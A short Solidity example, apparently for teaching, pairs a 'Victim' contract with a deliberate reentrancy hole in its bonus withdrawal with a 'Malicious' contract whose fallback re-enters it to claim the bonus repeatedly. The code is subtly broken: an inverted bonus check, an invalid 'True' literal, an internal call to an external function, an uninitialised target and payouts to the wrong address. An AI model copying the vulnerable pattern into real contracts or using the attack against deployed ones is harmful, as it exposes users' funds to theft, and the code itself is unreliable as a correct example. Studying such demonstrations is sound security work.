pragma solidity ^0.4.18;

contract Victim{
  mapping (address => uint) private userBalances;
  mapping (address => bool) private claimedBonus;
  mapping (address => uint) private rewardsForA;

  function Deposit() payable{ 
     userBalances[msg.sender] += msg.value; 
  } 

  function WithdrawReward(address recipient) external {
      uint amountToWithdraw = rewardsForA[recipient];
      rewardsForA[recipient] = 0;
      if (recipient.call.value(amountToWithdraw)() == false) {
           throw;
      }
  }

  function GetFirstWithdrawBonus(address recipient) external {
      if (claimedBonus[recipient] == false) {  // Each recipient should only be able to claim the bonus once
           throw;
      }
      rewardsForA[recipient] += 100;
      WithdrawReward(recipient);  // At this point, the caller will be able to execute getFirstWithdrawalBonus again
      claimedBonus[recipient] = True;
   }
}


pragma solidity ^0.4.18;
import './Victim.sol';

contract Malicious{
  address private _owner;
  Victim vul;
  uint public count = 0;

 //initial attack contract with the vulnerable address
 function Malicious(){ 
    _owner=msg.sender;
 }
 
 function attack(){
    vul.GetFirstWithdrawBonus(_owner);
 }
 
 function () payable{
    count++;
    if(count < 10){
      vul.GetFirstWithdrawBonus(_owner);
    }
 }
}
